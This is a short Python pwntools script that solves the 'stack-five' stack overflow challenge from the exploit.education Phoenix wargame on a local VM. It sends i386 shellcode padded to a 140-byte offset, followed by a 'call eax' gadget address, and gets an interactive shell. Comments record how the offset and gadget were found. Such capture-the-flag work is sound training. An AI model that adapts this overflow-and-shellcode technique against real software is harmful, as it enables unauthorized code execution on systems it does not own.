__author__ = '@tomereyz'
from pwn import *
import requests
from bs4 import BeautifulSoup

context.clear(arch='i386')


def main(download):
    localhost = 'localhost'
    user_name = 'root'
    challenge_name = 'stack-five'
    challenge_port = 2222

    ssh_client = ssh(user=user_name, host=localhost, password=user_name, port=challenge_port)
    if download:
        ssh_client.download('/opt/phoenix/i486/{}'.format(challenge_name))
        resp = requests.get('https://exploit.education/phoenix/{challenge_name}/'.format(challenge_name=challenge_name))
        bs_obj = BeautifulSoup(resp.content, 'html.parser')
        with open('{challenge_name}.c'.format(challenge_name=challenge_name), 'w') as f:
            f.write(bs_obj.find_all('code', {'class': 'language-c'})[0].text)

    r = ssh_client.process(executable='/opt/phoenix/i486/{}'.format(challenge_name))
    # b * start_level + 29 is ret
    #     gdb.attach(r, """
    # b * start_level+29
    # commands
    # info reg
    # x/1wx $sp
    # end
    # c
    # """)
    #     pause()

    # r.sendline(cyclic(256))
    # 0xffffdd3c:	0x6261616b
    # cyclic_find(0x6261616b) = 140

    # ROPgadget --binary stack-five | grep eax
    # 0x08048350 : call eax

    shell_code = asm(shellcraft.i386.sh())
    gadget_call_eax = 0x08048350

    payload = shell_code + 'A' * (140 - len(shell_code)) + pack(gadget_call_eax, word_size=32)
    r.sendline(payload)

    r.interactive()


if __name__ == '__main__':
    main(download=True)
